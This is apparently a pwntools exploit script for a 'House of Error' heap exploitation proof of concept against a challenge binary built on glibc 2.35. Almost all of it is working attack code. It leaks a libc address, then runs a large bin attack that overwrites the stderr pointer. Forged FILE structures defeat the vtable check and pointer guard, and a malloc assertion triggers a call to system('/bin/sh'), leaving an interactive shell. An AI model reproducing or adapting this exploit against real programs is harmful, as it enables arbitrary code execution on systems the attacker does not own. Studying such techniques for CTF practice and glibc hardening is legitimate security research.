from imghdr import what
from pwn import *

elf = context.binary = ELF('house_of_error_patched', checksec = False)
libc = ELF('libc.so.6', checksec = False)

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript = '''
                dir /home/john/Bench/poc3/libio/
                set breakpoint pending on
                b _IO_mem_sync
                b __malloc_assert
        ''')
    else:
        return process(elf.path)

pwnie_lands = [0,]*8

def select_option(option):
    io.sendlineafter(b'> ', str(option).encode())

def adjust_sizes(chunk_size): # copy pasted from HeapLABs ;)
    return (chunk_size & ~0x0f) - 8

def lock_pwnie_land():
    for i in range(8):
        if pwnie_lands[i] == 0:
            pwnie_lands[i] = 1
            return i
    return -1 # there is no available pwnie land!

def unlock_pwnie_land(pwnie_land):
    pwnie_lands[pwnie_land] = 0
    
def add_pwnie_land(pwnie_land_size, pwnie_land_contents):
    select_option(option = 1)
    io.sendlineafter(b'> ', hex(adjust_sizes(pwnie_land_size)).encode())
    io.sendlineafter(b'> ', pwnie_land_contents)
    return lock_pwnie_land()

def burn_pwnie_land(pwnie_land):
    select_option(option = 2)
    io.sendlineafter(b': ', str(pwnie_land).encode())
    unlock_pwnie_land(pwnie_land)
    
def largebin_offset(address):
    return address - 0x20

def house_of_error():
    # First step in House of Error is to do some heap feng shui and craft a large bin attack. 
    # glibc 2.30 introduced a mitigation in large bins but there is another unpatched path from where we can perform a large bin attack again!
    # If you are targeting an older glibc you can perform the classical large bin attack instead.
    
    # Useful resources to read about large bin attack:
    # https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/
    # https://github.com/shellphish/how2heap/blob/master/glibc_2.34/large_bin_attack.c
    
    # I will not describe the large bin attack as others already have done it, you can read about the attack from the above resources.
    
    # Note that in this particular glibc 2.35 build we have tcache enabled.
    
    target = largebin_offset(libc.sym.stderr) # we will target stderr pointer to unleash a House of Kiwi style attack inorder to execute our fake FILE stream. 
    # note that as I commented in the source code, stderr must not be used in main! Because then stderr will be located in the data section of our program.
    # Although there is still a way to exploit the program, even with stderr being used inside our code.
    # We can overwrite the stderr _chain pointer and upon exit our fake FILE stream will be triggered.
    # But this requires our fake FILE streams to not be corrupted until _IO_cleanup
    # In our case we cannot exit the program so this will not work in our case.
    # This is the main drawback of this technique we have to rely on some mechanism that will trigger our fake FILE stream.
    
    _locker = libc.address + 0x1f21f8
    
    _IO_UNBUFFERED = 0x0002
    
    pointer_guard = libc.address - 0x2890
    
    what = libc.sym._IO_vtable_check # we want to defeat vtable check.
    where = pointer_guard
    
    what2 = libc.sym.system # this will have both the effect of zeroing out the least significant byte of &stderr, pointing back to a different location in the heap but also will have a purpose as a fake vtable in our final stage. 
    where2 = libc.sym.stderr - 7
    
    # we want to craft our fake FILE stream first.
    fake_fs = FileStructure(null = _locker)
    fake_fs.vtable = libc.sym._IO_mem_jumps + (0x60 - 0x38) # __overflow => _sync => _IO_mem_sync ;)
    
    fake_fs._IO_save_end = (libc.sym.stderr - 7) - 0x60 # this will be our fake vtable pointer in our final fake FILE stream.
    
    fake_fs = bytes(fake_fs)
    
    fake_fs = fake_fs[0x10:] + p64(0)*2 + p64(where) + p64(where2)
    
    final_fake_fs = p8(0x0)*0x60 + b'/bin/sh\x00'
    
    pwnie_land_final_fake_fs = add_pwnie_land(pwnie_land_size = 0xd0, pwnie_land_contents=final_fake_fs)
    pwnie_land_overflow_A = add_pwnie_land(pwnie_land_size = 0x20, pwnie_land_contents=b'Corrupt the evil')
    pwnie_land_A = add_pwnie_land(pwnie_land_size = 0x820, pwnie_land_contents=fake_fs)
    pwnie_land_B = add_pwnie_land(pwnie_land_size=0x70, pwnie_land_contents=b'This pwnie land chunk will be used to corrupt pwnie_land_C->bk_nextsize pointer') # this will take a guard chunk role also.
    pwnie_land_C = add_pwnie_land(pwnie_land_size = 0x830, pwnie_land_contents=b'I am read to unleash a deadly large bin attack!')
    pwnie_land_guard_C = add_pwnie_land(pwnie_land_size = 0x40, pwnie_land_contents=b'Waiting to trigger our deadly FSOP!')
    
    # Initiate our large bin attack.
    burn_pwnie_land(pwnie_land_C) # free the biggest large chunk.
    
    # currently chunk 0x830 is linked in unsortedbin list, let's sort it to large bin list.
    pwnie_land_sorter_chunk = add_pwnie_land(pwnie_land_size=0x840, pwnie_land_contents=b'blah blah')
    burn_pwnie_land(pwnie_land_A) # free the smallest large chunk.
    
    burn_pwnie_land(pwnie_land_B) # we free this chunk inorder to overflow to pwnie_land_C and hijack bk_nextsize pointer.
    
    pwnie_land_B = add_pwnie_land(pwnie_land_size=0x70, pwnie_land_contents=b'A'*0x60 + p64(0x0) + p64(0x830) + p64(0x0) + p64(0x0) + p64(0x0) + p64(target))
    
    pwnie_land_sorter_chunk = add_pwnie_land(pwnie_land_size=0x840, pwnie_land_contents=p8(0)*0x838 + p64(0x0)) # we also want to corrupt top chunk pointer inorder to trigger sysmalloc
    # stderr now points back to our pwnie_land_A chunk.
    
    # before unleashing the true evil we need to fix some things first because stderr's _IO_write_ptr and _IO_write_base are not controlable from us.
    # we will trigger another heap overflow to fix those.
    # If you had a write-after-free bug instead you do not need the extra chunk.
    
    burn_pwnie_land(pwnie_land_overflow_A)
    
    fix_flags = p64(_IO_UNBUFFERED) # we want to add _IO_UNBUFFERED inorder to call buffered_vfprintf!
    fix_IO_read_ptr = p64(_locker) # this will be the _locker of our final fake FILE stream. 
    fix_IO_read_end = p64(0x0)
    fix_IO_read_base = p64(0x0)
    fix_IO_write_base = what
    fix_IO_write_ptr = fix_IO_write_base + what2
    
    fix_IO_write_base = p64(fix_IO_write_base)
    fix_IO_write_ptr = p64(fix_IO_write_ptr)
    
    fixes = fix_flags + fix_IO_read_ptr + fix_IO_read_end + fix_IO_read_base + fix_IO_write_base + fix_IO_write_ptr
    pwnie_land_overflow_A = add_pwnie_land(pwnie_land_size=0x20, pwnie_land_contents = p8(0x0)*0x10 + fixes)
    
    # last step we want to trigger our fake FILE stream through __malloc_assert
    # to trigger our fake FILE stream, essentially we need to trigger any malloc assertion.
    # The easiest way in our PoC is corrupting the top chunk.
    
    # we have already corrupted top chunk size so we only need to trigger it.
    pwnie_land_assert_starter = add_pwnie_land(pwnie_land_size=0x840, pwnie_land_contents=b'Unleash the evil _IO_mem_sync spirit!') 
    
    # __malloc_assert is called now, the beasts are unleashed! Corrupt the pwnie land and give us freedom!

io = start()

io.recvuntil(b'@ The ASLR god gifted you a present for your adventure: ') # skip blah blah
puts_leak = int(io.recvline(keepends = False), base = 16)
success(f'puts @ 0x{puts_leak:02x}')

libc.address = puts_leak - libc.sym.puts
success(f'libc @ 0x{libc.address:02x}')

house_of_error() # unleash the beast!

io.interactive()